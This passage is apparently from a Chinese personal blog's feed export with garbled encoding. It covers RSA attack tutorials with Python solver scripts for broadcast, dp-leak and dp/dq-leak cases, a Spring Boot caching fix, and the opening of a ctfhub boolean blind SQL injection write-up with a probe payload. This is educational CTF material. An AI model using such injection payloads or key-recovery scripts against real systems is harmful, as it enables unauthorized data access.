<h2 id="2-ä½åŠ å¯†æŒ‡æ•°å°æ˜æ–‡æ”»å‡»"><a href="#2-ä½åŠ å¯†æŒ‡æ•°å°æ˜æ–‡æ”»å‡»" class="headerlink" title="2.ä½åŠ å¯†æŒ‡æ•°å°æ˜æ–‡æ”»å‡»"></a>2.ä½åŠ å¯†æŒ‡æ•°å°æ˜æ–‡æ”»å‡»</h2><p>å¦‚æœé˜¿å¼ºæƒ³è¦å‘é€çš„æ•°æ®å¾ˆçŸ­ï¼Œå¾ˆç®€å•ï¼Œå³æ˜æ–‡<code>m</code>ç¼–ç åï¼Œå¯¹åº”æ•°å­¦ä¸Šï¼Œå…¶æ•°å€¼å¾ˆå°ï¼ŒåŠ ä¸Šå…¶å…¬é’¥ä¸­çš„<code>e</code>å¾ˆå°ï¼Œè®¡ç®—<code>m^e</code>çš„å€¼å¹¶æ²¡æœ‰è¶…è¿‡<code>n</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬æƒ³è¦å¾—åˆ°æ˜æ–‡ï¼Œç›´æ¥å°†å¯†æ–‡å¼€<code>e</code>æ¬¡æ–¹å³å¯ã€‚</p>
<p>æ­¤å¤–ï¼Œå¦‚æœå¯†æ–‡<code>c</code>è™½ç„¶å¤§äº<code>n</code>ï¼Œä½†æ˜¯å¹¶ä¸æ˜¯å¤ªå¤§ï¼Œç”±äºï¼š<br>$$<br>c\equiv m^e \pmod{n}<br>$$<br>å³å­˜åœ¨æ•´æ•°kï¼Œä½¿å¾—ï¼š<br>$$<br>c+kn=m^e<br>$$<br>æˆ‘ä»¬å¯ä»¥ç›´æ¥æš´åŠ›æšä¸¾<code>k</code>ï¼Œç„¶åå°†å…¶å¼€<code>e</code>æ¬¡æ–¹ï¼Œå¦‚æœå¯ä»¥å¼€å¾—å°½ï¼Œåˆ™è¯´æ˜æ‰¾åˆ°äº†æ˜æ–‡<code>m</code>ã€‚</p>
<h2 id="3-å…±æ¨¡æ”»å‡»"><a href="#3-å…±æ¨¡æ”»å‡»" class="headerlink" title="3.å…±æ¨¡æ”»å‡»"></a>3.å…±æ¨¡æ”»å‡»</h2><p>å¦‚æœé˜¿çä½¿ç”¨äº†ç›¸åŒçš„<code>n</code>ï¼Œä¸åŒçš„æŒ‡æ•°<code>e1</code>ï¼Œ<code>e2</code>,åŒæ—¶è¿™ä¸¤ä¸ªæŒ‡æ•°äº’ç´ ï¼Œå¹¶ä¸”å¾—åˆ°äº†å¯¹åŒä¸€ç»„æ˜æ–‡åŠ å¯†åçš„å¯†æ–‡<code>c1</code>å’Œ<code>c2</code>ï¼Œåœ¨ä¸è·å–ç§é’¥çš„æƒ…å†µä¸‹ä¹Ÿèƒ½å°†æ˜æ–‡è§£æ¥ï¼ŒåŸç†å¦‚ä¸‹ï¼š</p>
<p>è®¾ï¼š<br>$$<br>c_1=m^{e_1}\pmod{n}<br>$$<br>å’Œ<br>$$<br>c_2=m^{e_2}\pmod{n}<br>$$<br>ç”±äº<code>e1</code>å’Œ<code>e2</code>äº’ç´ ï¼Œå­˜åœ¨æ•´æ•°xå’Œyï¼Œä½¿å¾—ï¼š<br>$$<br>xe_1+ye_2=1<br>$$<br>xå’Œyå¯ä»¥é€šè¿‡<a href="https://baike.baidu.com/item/%E6%89%A9%E5%B1%95%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95/2029414" target="_blank" rel="noopener">æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•</a>æ±‚è§£å‡ºæ¥ã€‚</p>
<p>è¿›ä¸€æ­¥æœ‰ï¼š<br>$$<br>c_{1}^{x}c_{2}^{y} \pmod{n}=m^{xe_1}m^{ye_2}\pmod{n}=m^1\pmod{n}=m<br>$$<br>å³å¯è·å¾—æ˜æ–‡ã€‚</p>
<h2 id="4-å¹¿æ’­æ”»å‡»"><a href="#4-å¹¿æ’­æ”»å‡»" class="headerlink" title="4.å¹¿æ’­æ”»å‡»"></a>4.å¹¿æ’­æ”»å‡»</h2><p>å¯¹äºç›¸åŒçš„æ˜æ–‡ï¼Œå¦‚æœé˜¿å¼ºä½¿ç”¨äº†ç›¸åŒçš„æ˜æ–‡<code>m</code>ï¼Œç›¸åŒçš„æŒ‡æ•°<code>e</code>ï¼Œä½†æ˜¯ä¸åŒçš„<code>n1</code>,<code>n2</code>,<code>n3</code>â€¦<code>nh</code>(h&gt;=e)ï¼ŒåŒæ—¶æš´éœ²äº†å¯¹åº”çš„æ¯ä¸ªå¯†æ–‡ï¼Œå¯ä»¥ä½¿ç”¨ä¸­å›½å‰©ä½™å®šç†è§£å‡ºæ˜æ–‡<code>m</code>ã€‚</p>
<p>è®¾ï¼š<br>$$<br>\left{\begin{matrix}<br>c_1=m^e\pmod{n_1}<br> \<br>c_2=m^e\pmod{n_2}<br>\<br>â€¦<br>\<br>c_h=m^e\pmod{n_h}<br>\end{matrix}\right.<br>$$<br>å€ŸåŠ©<a href="https://baike.sogou.com/v1853008.htm?fromTitle=%E4%B8%AD%E5%9B%BD%E5%89%A9%E4%BD%99%E5%AE%9A%E7%90%86" target="_blank" rel="noopener">ä¸­å›½å‰©ä½™å®šç†</a>,å‡è®¾<code>ni</code>ä¸¤ä¸¤äº’ç´ ï¼Œä»¤ï¼š<br>$$<br>N=\prod_{i=1}^{h} n_i<br>$$</p>
<p>$$<br>N_i=\frac{N}{n_i}<br>$$</p>
<p>åˆ™ä¸Šè¿°åŒä½™æ–¹ç¨‹ç»„æœ‰å”¯ä¸€è§£ï¼š<br>$$<br>X=m^e\equiv\sum_{i=1}^{h} c_iN_iy_i \pmod{N}<br>$$<br>å…¶ä¸­ï¼š<br>$$<br>N_iy_i\equiv1\pmod{n_i}<br>$$</p>
<p>ä¾‹å¦‚ï¼Œå‡è®¾å¼ ä¸‰æƒ³è¦å‘é€æ¶ˆæ¯ç»™ç”²ä¹™ä¸™ä¸‰ä¸ªäººï¼Œå¼ ä¸‰æ‰‹ä¸Šä¹Ÿæœ‰å¯¹åº”çš„ä¸‰ä¸ªå…¬é’¥<code>&lt;205,3&gt;&lt;187,3&gt;&lt;667,3&gt;</code>ï¼Œä»–æƒ³å‘é€çš„æ¶ˆæ¯<code>m=10</code>ï¼ŒåŠ å¯†åçš„å¯†æ–‡åˆ†åˆ«æ˜¯180ï¼Œ65ï¼Œ333</p>
<p>è¿™ä¸‰ç»„å…¬é’¥å’Œå¯†æ–‡åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­è¢«æå››æˆªå–ï¼Œä»–ç«‹é©¬å†™ä¸‹è„šæœ¬è¿›è¡Œçªƒå–ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ä¸­å›½å‰©ä½™å®šç†çš„ä»£ç æ¥è‡ªrosettacode Wiki</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CRT</span><span class="params">(c,n)</span>:</span></span><br><span class="line">    sum = <span class="number">0</span></span><br><span class="line">    <span class="comment"># ni çš„ä¹˜ç§¯,N=n1*n2*n3</span></span><br><span class="line">    N = reduce(<span class="keyword">lambda</span> x,y:x*y,n)</span><br><span class="line">    <span class="comment"># zip()å°†å¯¹è±¡æ‰“åŒ…æˆå…ƒç»„</span></span><br><span class="line">    <span class="keyword">for</span> n_i, c_i <span class="keyword">in</span> zip(n,c):</span><br><span class="line">        <span class="comment"># Ni=N/ni</span></span><br><span class="line">        N_i = N // n_i</span><br><span class="line">        <span class="comment"># Ni y == 1 % ni æ±‚é€†å…ƒ</span></span><br><span class="line">        y = gmpy2.invert(N_i,n_i)</span><br><span class="line">        sum += c_i * N_i * y</span><br><span class="line">    <span class="keyword">return</span> sum % N</span><br><span class="line">n1, n2, n3 = <span class="number">205</span>, <span class="number">187</span>, <span class="number">667</span></span><br><span class="line">c1, c2, c3 = <span class="number">180</span>, <span class="number">65</span>, <span class="number">333</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">n = [n1, n2, n3]</span><br><span class="line">c = [c1, c2, c3]</span><br><span class="line"></span><br><span class="line">x = CRT(c,n)</span><br><span class="line"><span class="comment"># å°†xå¼€eæ¬¡æ–¹</span></span><br><span class="line">m = gmpy2.iroot(x,e)[<span class="number">0</span>]</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure>



<h2 id="5-ä½è§£å¯†æŒ‡æ•°æ”»å‡»"><a href="#5-ä½è§£å¯†æŒ‡æ•°æ”»å‡»" class="headerlink" title="5.ä½è§£å¯†æŒ‡æ•°æ”»å‡»"></a>5.ä½è§£å¯†æŒ‡æ•°æ”»å‡»</h2><p>1989å¹´ï¼ŒMichael J.Wienerå‘è¡¨äº†<a href="https://ieeexplore.ieee.org/abstract/document/54902" target="_blank" rel="noopener">Cryptanalysis of Short RSA Secret Exponents</a>æ–‡ç« ï¼Œæå‡ºäº†ä¸€ç§é’ˆå¯¹è§£å¯†æŒ‡æ•°<code>d</code>è¾ƒä½æ—¶å¯¹äºRSAçš„æ”»å‡»æ–¹æ³•ï¼Œè¯¥æ–¹æ³•åŸºäºè¿åˆ†æ•°,è®¾ï¼š<br>$$<br>ed=1+k \varphi(n)<br>$$<br>å½“q&lt;p&lt;2qæ—¶ï¼Œè‹¥æ»¡è¶³ï¼š<br>$$<br>d&lt;\frac{1}{3}  n ^{\frac{1}{4}}<br>$$<br>åˆ™é€šè¿‡æœç´¢è¿åˆ†æ•°e/Nçš„æ”¶æ•›ï¼Œå¯ä»¥æœ‰æ•ˆç‡åœ°æ‰¾åˆ°k/dï¼Œä»è€Œæ¢å¤æ­£ç¡®çš„dã€‚</p>
<p>ç›®å‰ï¼Œå¯¹äºæ­¤ç§æ”»å‡»å·²æœ‰å®Œå¤‡çš„å®ç°ï¼Œåœ¨<a href="https://github.com/pablocelayes/rsa-wiener-attack" target="_blank" rel="noopener">GitHub</a>å¯ä»¥æ‰¾åˆ°å®Œæ•´å¯ç”¨çš„æ”»å‡»ä»£ç </p>
<h2 id="6-dpæ³„éœ²"><a href="#6-dpæ³„éœ²" class="headerlink" title="6.dpæ³„éœ²"></a>6.dpæ³„éœ²</h2><blockquote>
<p>dp = d % (p-1)å¹¶éå­—é¢ä¸Šdå’Œpç›¸ä¹˜</p>
</blockquote>
<p>å¦‚æœå·²çŸ¥<code>dp</code>,<code>e</code>,<code>n</code>,<code>c</code>ï¼Œåˆ™å¯ä»¥è§£å‡ºæ˜æ–‡<code>m</code>ã€‚è¯æ˜å¦‚ä¸‹,å·²çŸ¥ï¼š<br>$$<br>c \equiv m^e \pmod{n} \tag{1}<br>$$</p>
<p>$$<br>m \equiv c^d \pmod{n} \tag{2}<br>$$</p>
<p>$$<br>DP = d \bmod(p-1) \tag{3}<br>$$</p>
<p>å¯¹å¼å­ï¼ˆ3ï¼‰ä¸¤è¾¹åŒä¹˜<code>e</code>ï¼Œæœ‰<br>$$<br>DP e\equiv de \pmod{p-1}<br>$$<br>åˆ™å­˜åœ¨æ•´æ•°<code>k1</code>ï¼Œä½¿å¾—ï¼š<br>$$<br>de=k_1(p-1)+DPe \tag{4}<br>$$<br>è€Œ<br>$$<br>de\equiv1 \pmod{\varphi(n)}<br>$$<br>å³<br>$$<br>de\equiv1\pmod{(p-1)(q-1)}<br>$$<br>æ•…å­˜åœ¨ä¸€ä¸ªæ•´æ•°<code>k2</code>ï¼Œä½¿å¾—ï¼š<br>$$<br>de=k_2(p-1)(q-1)+1<br>$$<br>å¸¦å…¥åˆ°å¼å­ï¼ˆ4ï¼‰å¹¶æ•´ç†ï¼Œå¾—åˆ°<br>$$<br>DPe=(p-1)(k_2(q-1)-k_1) + 1<br>$$<br>å†ä»¤<br>$$<br>x=k_2(q-1)<br>$$<br>å³<br>$$<br>DPe=(p-1)x+1<br>$$<br>è§£å¾—<br>$$<br>x=\frac{DPe}{p-1}-\frac{1}{p-1}<br>$$<br>æ ¹æ®å®šä¹‰ï¼Œ<code>DP&lt;(p-1)</code>ï¼Œå› æ­¤<code>1&lt;x&lt;e</code>ã€‚</p>
<p>å¦‚æœ<code>e</code>ä¸å¤§ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥æš´åŠ›æšä¸¾<code>x</code>,å½“å…¶èƒ½å¤Ÿæ•´é™¤<code>DPe-1</code>æ—¶å€™ï¼Œåˆ™<code>p</code>å°±å¯ä»¥æ‰¾åˆ°äº†ï¼Œæ‰¾åˆ°ä»¥åè¿›ä¸€æ­¥è§£å¾—<code>q</code>ï¼Œè¿›ä¸€æ­¥å¾—åˆ°<code>d</code>ï¼Œä»è€Œæ¢å¤åŸæ–‡ã€‚</p>
<p>ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113</span></span><br><span class="line">dp = <span class="number">905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751</span></span><br><span class="line"><span class="comment"># åœ¨èŒƒå›´(1,e)ä¹‹é—´è¿›è¡Œéå†</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, e):</span><br><span class="line">    <span class="comment"># è‹¥å­˜åœ¨ x ï¼Œä½¿å¾— de*e - 1 èƒ½è¢« x æ•´é™¤</span></span><br><span class="line">    <span class="keyword">if</span> (dp * e - <span class="number">1</span>) % x == <span class="number">0</span>:</span><br><span class="line">        pp = ((dp * e - <span class="number">1</span>) // x) + <span class="number">1</span></span><br><span class="line">        <span class="comment"># ç¡®ä¿ p èƒ½å¤Ÿæ•´é™¤ n</span></span><br><span class="line">        <span class="keyword">if</span> n % pp == <span class="number">0</span>:</span><br><span class="line">            p = pp</span><br><span class="line">            q = n // (((dp * e - <span class="number">1</span>) // x) + <span class="number">1</span>)</span><br><span class="line">            phi = (q - <span class="number">1</span>) * (p - <span class="number">1</span>)</span><br><span class="line">            <span class="comment"># æ±‚æ¨¡é€†</span></span><br><span class="line">            d = gmpy2.invert(e, phi)</span><br><span class="line">            m = gmpy2.powmod(c, d, n)</span><br><span class="line">            print(m)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h2 id="7-dp-dqæ³„éœ²"><a href="#7-dp-dqæ³„éœ²" class="headerlink" title="7. dp,dqæ³„éœ²"></a>7. dp,dqæ³„éœ²</h2><blockquote>
<p>dp = d % (p-1), dq = d % (q-1),å¹¶éå­—é¢ä¸Šdå’Œpç›¸ä¹˜</p>
</blockquote>
<p>å¦‚æœå·²çŸ¥<code>dp</code>,<code>dq</code>,<code>p</code>,<code>q</code>,<code>c</code>ï¼Œåˆ™å¯ä»¥è§£å‡ºæ˜æ–‡<code>m</code>ã€‚è¯æ˜å¦‚ä¸‹,å·²çŸ¥<br>$$<br>c \equiv m^e \pmod{n} \tag{1}<br>$$</p>
<p>$$<br>m \equiv c^d \pmod{n} \tag{2}<br>$$</p>
<p>$$<br>DP = d \bmod(p-1) \tag{3}<br>$$</p>
<p>$$<br>DQ = d \bmod(q-1) \tag{4}<br>$$</p>
<p>ç”±å¼å­ï¼ˆ2ï¼‰å¯å¾—ï¼š<br>$$<br>m=c^d+kn=c^d+kpq<br>$$<br>å¯¹ä¸Šå¼å­åˆ†åˆ«å¯¹<code>p</code>å’Œ<code>q</code>å–æ¨¡,æœ‰ï¼š<br>$$<br>m_1 \equiv c^d \pmod{p} \tag{5}<br>$$</p>
<p>$$<br>m_2 \equiv c^d \pmod{q} \tag{6}<br>$$</p>
<p>å¯¹å¼å­ï¼ˆ5ï¼‰ï¼Œè¯å¥è¯è¯´ï¼Œæœ‰ï¼š<br>$$<br>m_1 + kp = c^d \tag{7}<br>$$<br>å³ï¼š<br>$$<br>m_1+kp \equiv c^d \pmod{q}<br>$$<br>å°†ä¸Šå¼å­å¸¦å…¥å¼å­ï¼ˆ6ï¼‰ï¼Œæœ‰ï¼š<br>$$<br>kp \equiv (m_2-m_1) \pmod{q}<br>$$<br>å› ä¸º<code>p</code>å’Œ<code>q</code>äº’ç´ ï¼ŒäºŒè€…æœ€å¤§å…¬çº¦æ•°ä¸º1,æœ‰ï¼š<br>$$<br>k \equiv pâ€™(m_2-m_1) \pmod{q} \tag{8}<br>$$<br><code>p&#39;</code>æ˜¯<code>p</code>å…³äº<code>q</code>çš„é€†å…ƒ,å³ï¼š<br>$$<br>ppâ€™ \equiv1 \pmod{q}<br>$$<br>è”ç«‹ï¼ˆ7ï¼‰å’Œï¼ˆ8ï¼‰ï¼Œæœ‰ï¼š<br>$$<br>c^d=m_1+((pâ€™(m_2-m_1) )\bmod{q} )p<br>$$<br>å†å¸¦å…¥å¼å­ï¼ˆ2ï¼‰ï¼Œæœ‰ï¼š<br>$$<br>m \equiv (m_1+((pâ€™(m_2-m_1) )\bmod{q} )p )\pmod{n} \tag{9}<br>$$<br>ä¸‹é¢æˆ‘ä»¬æ¥æ±‚<code>m1</code>å’Œ<code>m2</code>.</p>
<p>ç”±å¼å­ï¼ˆ3ï¼‰ï¼Œå¾—ï¼š<br>$$<br>d=DP+k(p-1)<br>$$<br>å°†ä¸Šå¼å­ï¼ˆ5ï¼‰ï¼Œæœ‰ï¼š<br>$$<br>m_1 \equiv c^{DP+k(p-1)} \pmod{p}<br>$$<br>å³ï¼š<br>$$<br>m_1 \equiv c^{DP}c^{k(p-1)} \pmod{p}<br>$$<br>æ ¹æ®è´¹é©¬å°å®šç†ï¼Œè‹¥<code>p</code>æ˜¯ç´ æ•°,ä¸”<code>gcd(c,p)=1</code>ï¼Œåˆ™<code>c^(p-1)=1 mod p</code>ã€‚</p>
<p>å³<br>$$<br>c^{k(p-1)} \pmod{p} \equiv (c^{p-1}\pmod{p})^{k}\pmod{p}\equiv1<br>$$<br>æ•…ï¼š<br>$$<br>m_1=c^{DP} \pmod{p}<br>$$<br>åŒç†<br>$$<br>m_2=c^{DQ} \pmod{q}<br>$$<br>å°†è¿™ä¸¤ä¸ªå¼å­å›ä»£åˆ°å¼å­ï¼ˆ9ï¼‰å³å¯æ±‚å‡ºæ˜æ–‡ã€‚</p>
<p>ä½¿ç”¨<code>python</code>è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = <span class="number">8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229</span> </span><br><span class="line">q = <span class="number">12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469</span> </span><br><span class="line">dp = <span class="number">6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929</span> </span><br><span class="line">dq = <span class="number">783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041</span> </span><br><span class="line">c = <span class="number">24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span></span><br><span class="line">n = p * q</span><br><span class="line">m1 = pow(c,dp,p)</span><br><span class="line">m2 = pow(c,dq,q)</span><br><span class="line">I = gmpy2.invert(p,q)</span><br><span class="line">m = (m1 + I * ((m2 - m1) % q) * p) % n</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure>

<p>8</p>
]]></content>
      <categories>
        <category>ç®—æ³•</category>
      </categories>
      <tags>
        <tag>å¯†ç å­¦</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring Boot @Cacheable å¤±æ•ˆçš„è§£å†³æ–¹æ³•</title>
    <url>/2020/07/31/Spring-Boot-Cacheable-%E5%A4%B1%E6%95%88%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<blockquote>
<p>æ–‡ç« å‚è€ƒäº†åšå®¢å›­çš„ <strong>zhaoyue1215</strong> ç”¨æˆ·åˆ†äº«çš„æ–‡ç« ã€<a href="https://www.cnblogs.com/zhaoyue1215/p/9267584.html" target="_blank" rel="noopener">Spring @Cacheable ç¼“å­˜ä¸ç”Ÿæ•ˆçš„é—®é¢˜</a>ã€‘</p>
</blockquote>
<p>ä»Šå¤©åœ¨ä½¿ç”¨<code>Spring Boot</code>çš„ç¼“å­˜æ—¶å€™ï¼Œå‘ç°æ§åˆ¶å°ä¸€ç›´è¾“å‡º<code>Hibernate</code>è®¿é—®æ•°æ®åº“æ—¶æ‰§è¡Œçš„<code>Sql</code>è¯­å¥ï¼Œ<code>@EnableCaching</code>æ³¨è§£å·²ç»æ·»åŠ åˆ°ä¸»å¯åŠ¨ç±»ä¸­ï¼Œ <code>@Cacheable</code>ä¹ŸåŠ åˆ°äº†ç›¸åº”çš„æœåŠ¡æ–¹æ³•ä¸Šï¼Œä½†æ˜¯æˆ‘æŠŠæ–­ç‚¹æ‰“åˆ°äº†<code>ConcurrentMapCacheManager</code>ç±»ä¸­çš„æ–¹æ³•<code>getCache(String name)</code>ä¸Šåï¼Œæµ‹è¯•è¿‡ç¨‹å‘ç°æ ¹æœ¬å°±æ²¡æœ‰è°ƒç”¨è¯¥æ–¹æ³•ï¼Œå³ç¼“å­˜ä¸ç”Ÿæ•ˆï¼<a id="more"></a></p>
<h2 id="è§£å†³åŠæ³•"><a href="#è§£å†³åŠæ³•" class="headerlink" title="è§£å†³åŠæ³•"></a>è§£å†³åŠæ³•</h2><p>åæ¥æŸ¥é˜…èµ„æ–™å‘ç°ï¼Œå¦‚æœæ³¨è§£éƒ½æ­£ç¡®æ·»åŠ ï¼Œç¼“å­˜ä¸ç”Ÿæ•ˆçš„å¯èƒ½æ˜¯å› ä¸ºè¢«æ·»åŠ <code>@Cacheable</code>çš„æ–¹æ³•æ˜¯åœ¨å†…éƒ¨è¢«å…¶ä»–æ–¹æ³•ï¼Œè¿™æ ·å­æ˜¯æ— æ³•ä½¿ç”¨ç¼“å­˜çš„ï¼Œä¾‹å¦‚è¯´æˆ‘è¿™æ¬¡æƒ…å†µï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* å°†æ•°æ®åº“ä¸­çš„Blogå¯¹è±¡å–å‡ºæ¥ï¼Œå°†å…¶å±æ€§contentï¼ˆMarkDownè¯­æ³•ï¼‰è½¬ä¸ºHTMLæ ¼å¼</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Blog <span class="title">getAndConvert</span><span class="params">(Long id)</span> </span>&#123;</span><br><span class="line">    Blog blog = getBlog(id)</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">return</span> blog;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Cacheble</span>()</span><br><span class="line"><span class="function"><span class="keyword">public</span> Blog <span class="title">getBlog</span><span class="params">(Long id)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">return</span> blog;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å› ä¸º<code>@Cacheable</code>æ˜¯åŸºäº<code>Spring AOP</code>ä»£ç†ç±»ï¼Œå†…éƒ¨æ–¹æ³•è°ƒç”¨æ˜¯ä¸èµ°ä»£ç†çš„ï¼Œ<code>@Cacheable</code>æ˜¯ä¸èµ·ä½œç”¨çš„ ï¼Œå› æ­¤éœ€è¦å°†è¿™ä¸¤ä¸ªæ–¹æ³•æ”¾åˆ°ä¸åŒçš„ç±»ä¸­ã€‚</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Spring Boot</tag>
        <tag>ç¼“å­˜</tag>
      </tags>
  </entry>
  <entry>
    <title>SQLæ³¨å…¥éªšæ“ä½œä¹‹å¸ƒå°”ç›²æ³¨</title>
    <url>/2022/06/15/SQL%E6%B3%A8%E5%85%A5%E9%AA%9A%E6%93%8D%E4%BD%9C%E4%B9%8B%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/</url>
    <content><![CDATA[<p>è¿™æ®µæ—¶é—´å­¦ä¹ <code>SQL</code>æ³¨å…¥çš„æ—¶å€™ï¼Œå‘ç°äº†ä¸€ä¸ªè´¼æœ‰æ„æ€çš„çŸ¥è¯†ç‚¹â€”â€”å¸ƒå°”ç›²æ³¨ã€‚è¯¥æ³¨å…¥æ–¹å¼ä¸€èˆ¬ç”¨äºé¡µé¢å›æ˜¾ä¿¡æ¯åªæœ‰ä¸¤ç§æƒ…å†µçš„æ—¶å€™ï¼Œæ°å¥½å¯¹åº”å¸ƒå°”å€¼ä¸­çš„<code>ture</code>å’Œ<code>false</code>ã€‚<a id="more"></a></p>
<hr>
<p>æœ¬æ–‡å‚è€ƒè‡ªæ–‡ç« <a href="https://blog.csdn.net/qq_35569814/article/details/100175886" target="_blank" rel="noopener">SQLæ³¨å…¥ä¹‹å¸ƒå°”ç›²æ³¨</a></p>
<h2 id="ç›¸å…³å‡½æ•°"><a href="#ç›¸å…³å‡½æ•°" class="headerlink" title="ç›¸å…³å‡½æ•°"></a>ç›¸å…³å‡½æ•°</h2><p>å¸ƒå°”ç›²æ³¨ä¸»è¦ç”¨ä¸‰ä¸ªå‡½æ•°</p>
<h3 id="length-str"><a href="#length-str" class="headerlink" title="length(str)"></a>length(str)</h3><p>è¿”å›å­—ç¬¦ä¸²<code>str</code>çš„é•¿åº¦ï¼Œä»¥å­—èŠ‚ä¸ºå•ä½ã€‚</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">length</span>(<span class="string">'hello'</span>); <span class="comment"># 5</span></span><br></pre></td></tr></table></figure>

<h3 id="substr-string-start-length"><a href="#substr-string-start-length" class="headerlink" title="substr(string, start, length)"></a>substr(string, start, length)</h3><p>stringä¸ºå­—ç¬¦ä¸²ï¼›startä¸ºèµ·å§‹ä½ç½®ï¼›lengthä¸ºé•¿åº¦ã€‚</p>
<blockquote>
<p>æ³¨æ„ï¼šmysqlä¸­çš„startæ˜¯ä»1å¼€å§‹çš„ã€‚</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">substr</span>(<span class="string">'hello'</span>,<span class="number">1</span>,<span class="number">1</span>); <span class="comment"># h</span></span><br></pre></td></tr></table></figure>

<h3 id="ascii-character"><a href="#ascii-character" class="headerlink" title="ascii(character)"></a>ascii(character)</h3><p>è¿”å›å­—ç¬¦<code>character</code>çš„<code>ASCII</code>å€¼ï¼Œå¦‚æœä¼ å…¥çš„æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œåˆ™è¿”å›å…¶ç¬¬ä¸€ä¸ªå­—ç¬¦çš„<code>ASCII</code>å€¼ã€‚</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">ascii</span>(<span class="string">'a'</span>); <span class="comment"># 97</span></span><br></pre></td></tr></table></figure>

<h2 id="æ³¨å…¥å®ç°"><a href="#æ³¨å…¥å®ç°" class="headerlink" title="æ³¨å…¥å®ç°"></a>æ³¨å…¥å®ç°</h2><p>é¢˜ç›®æ¥æºï¼š<a href="https://www.ctfhub.com/#/skilltree" target="_blank" rel="noopener">ctfhubå¸ƒå°”ç›²æ³¨</a></p>
<p>æ‰“å¼€åœºæ™¯åï¼Œè¾“å…¥1æˆ–è€…2ï¼Œé¡µé¢éƒ½æ˜¾ç¤º<code>query_success</code>ï¼Œè¾“å…¥<code>3</code>åˆ™æ˜¾ç¤º<code>query_error</code>ï¼Œåˆæ­¥åˆ¤è¯»æ˜¯å¯ä»¥è¿›è¡Œç›²æ³¨ï¼ˆåˆ«åˆ¤æ–­äº†ï¼Œé¢˜ç›®å°±è¯´äº†æ˜¯å¸ƒå°”ç›²æ³¨ğŸ™ƒï¼‰ã€‚</p>
<p>æŒ‰ç…§æ­£å¸¸æµç¨‹ï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥å°±æ˜¯<strong>çŒœæ•°æ®åº“åå­—</strong>äº†ï¼Œå…ˆæŸ¥ä¸€ä¸‹æ•°æ®åº“åå­—é•¿åº¦ï¼š</p>
<p>è¾“å…¥ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1 and length((<span class="keyword">select</span> <span class="keyword">database</span>()))=<span class="number">5</span></span><br></pre></td></tr></table></figure>

<p>å‘ç°ä¸è¡Œï¼Œç»§ç»­å°è¯•ï¼š</p>
